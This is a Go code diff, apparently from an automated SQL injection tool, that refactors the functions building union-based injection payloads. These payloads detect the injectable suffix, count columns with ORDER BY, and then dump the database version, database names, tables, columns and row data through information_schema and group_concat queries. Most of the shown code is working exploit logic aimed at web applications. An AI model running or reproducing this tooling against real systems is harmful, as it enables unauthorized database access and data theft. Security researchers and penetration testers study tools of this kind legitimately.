@@ -30,10 +30,10 @@ func DetectErrorBasedSqlInject(url string, method string) (bool, string) {
 }
 
 func GetSuffix(target string) (bool, string) {
-	payload := "%20AnD%20'SQLMaP'='SQLMaP'%20--+"
-	_, _, defaultBody := util.Request("GET", target, nil, nil)
+	_, _, defaultBody := util.Request(constant.DefaultMethod, target, nil, nil)
 	for _, v := range constant.SuffixList {
-		_, _, body := util.Request("GET", target+v+payload, nil, nil)
+		payload := target + v + constant.ErrorBasedSuffixPayload
+		_, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
 		if string(defaultBody) == string(body) {
 			return true, v
 		}
@@ -42,13 +42,13 @@ func GetSuffix(target string) (bool, string) {
 }
 
 func GetOrderByNum(suffix string, url string) int {
-	order := "order%20by"
 	for i := 1; ; i++ {
-		payload := url + suffix + constant.Space + order +
+		payload := url + suffix + constant.Space + constant.ErrorBasedOrderPayload +
 			constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, body := util.Request("GET", payload, nil, nil)
+		code, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
 		if code != -1 {
-			if strings.Contains(string(body), constant.OrderKeyword) {
+			if strings.Contains(strings.ToLower(string(body)),
+				strings.ToLower(constant.OrderKeyword)) {
 				return i
 			}
 		}
@@ -56,21 +56,20 @@ func GetOrderByNum(suffix string, url string) int {
 }
 
 func GetUnionSelectPos(suffix string, url string, key int) Pos {
-	url = url + "0"
-	union := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	unionSql := bytes.Buffer{}
-	unionSql.WriteString(url + suffix + constant.Space + union + constant.Space)
+	unionSql.WriteString(url + suffix + constant.Space +
+		constant.ErrorBasedUnionSelect + constant.Space)
 	rand.Seed(time.Now().UnixNano())
 	randMap := make(map[int]int)
 	for i := 1; i < key; i++ {
-		x := rand.Intn(10000000)
+		x := rand.Intn(constant.DefaultRandomRange)
 		randMap[i] = x
 		unionSql.WriteString(strconv.Itoa(x) + ",")
 	}
-	r := []rune(unionSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(unionSql.String())
 	unionPayload := res + constant.Space + constant.Annotator
-	code, _, tempBody := util.Request("GET", unionPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, unionPayload, nil, nil)
 	if code != -1 {
 	}
 	body := string(tempBody)
@@ -87,17 +86,16 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 }
 
 func GetVersion(pos Pos, suffix string, url string, key int) string {
-	url = url + "0"
-	version := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	versionSql := bytes.Buffer{}
-	versionSql.WriteString(url + suffix + constant.Space + version + constant.Space)
+	versionSql.WriteString(url + suffix + constant.Space +
+		constant.ErrorBasedUnionSelect + constant.Space)
 	for i := 1; i < key; i++ {
-		versionSql.WriteString("version(),")
+		versionSql.WriteString(constant.VersionFunc + ",")
 	}
-	r := []rune(versionSql.String())
-	res := string(r[:len(r)-1])
+	res := util.DeleteLastChar(versionSql.String())
 	versionPayload := res + constant.Space + constant.Annotator
-	code, _, tempBody := util.Request("GET", versionPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, versionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		innerR := []rune(body)
@@ -110,17 +108,17 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 }
 
 func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
-	url = url + "0"
-	database := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	databaseSql := bytes.Buffer{}
-	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
+	databaseSql.WriteString(url + suffix + constant.Space +
+		constant.ErrorBasedUnionSelect + constant.Space)
 	for i := 1; i < key; i++ {
-		databaseSql.WriteString("database(),")
+		databaseSql.WriteString(constant.DatabaseFunc + ",")
 	}
 	r := []rune(databaseSql.String())
 	res := string(r[:len(r)-1])
 	databasePayload := res + constant.Space + constant.Annotator
-	code, _, tempBody := util.Request("GET", databasePayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, databasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		innerR := []rune(body)
@@ -133,8 +131,8 @@ func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 }
 
 func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
-	url = url + "0"
-	database := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
+	database := constant.ErrorBasedUnionSelect
 	databaseSql := bytes.Buffer{}
 	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
 	for i := 1; i < key; i++ {
@@ -158,10 +156,9 @@ func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
 }
 
 func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
-	url = url + "0"
-	table := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	tableSql := bytes.Buffer{}
-	tableSql.WriteString(url + suffix + constant.Space + table + constant.Space)
+	tableSql.WriteString(url + suffix + constant.Space + constant.ErrorBasedUnionSelect + constant.Space)
 	for i := 1; i < key; i++ {
 		tableSql.WriteString("group_concat(table_name),")
 	}
@@ -169,7 +166,7 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 	res := string(r[:len(r)-1])
 	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
 	tablePayload := res + constant.Space + fromSql + constant.Annotator
-	code, _, tempBody := util.Request("GET", tablePayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		innerR := []rune(body)
@@ -183,10 +180,10 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 }
 
 func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
-	url = url + "0"
-	column := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	columnSql := bytes.Buffer{}
-	columnSql.WriteString(url + suffix + constant.Space + column + constant.Space)
+	columnSql.WriteString(url + suffix + constant.Space +
+		constant.ErrorBasedUnionSelect + constant.Space)
 	for i := 1; i < key; i++ {
 		columnSql.WriteString("group_concat(column_name),")
 	}
@@ -195,7 +192,7 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
 		"'%20and%20table_schema='" + database + "'%20"
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
-	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		innerR := []rune(body)
@@ -209,10 +206,10 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 }
 
 func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
-	url = url + "0"
-	data := "union%20select"
+	url = url + constant.ErrorBasedUnionCondition
 	dataSql := bytes.Buffer{}
-	dataSql.WriteString(url + suffix + constant.Space + data + constant.Space)
+	dataSql.WriteString(url + suffix + constant.Space +
+		constant.ErrorBasedUnionSelect + constant.Space)
 	for i := 1; i < key; i++ {
 		prefix := "group_concat("
 		for _, v := range columns {
@@ -226,7 +223,7 @@ func GetData(pos Pos, suffix string, url string, key int, database string, table
 	res := string(r[:len(r)-1])
 	fromSql := "from%20" + database + "." + tableName
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
-	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
+	code, _, tempBody := util.Request(constant.DefaultMethod, columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
 		innerR := []rune(body)
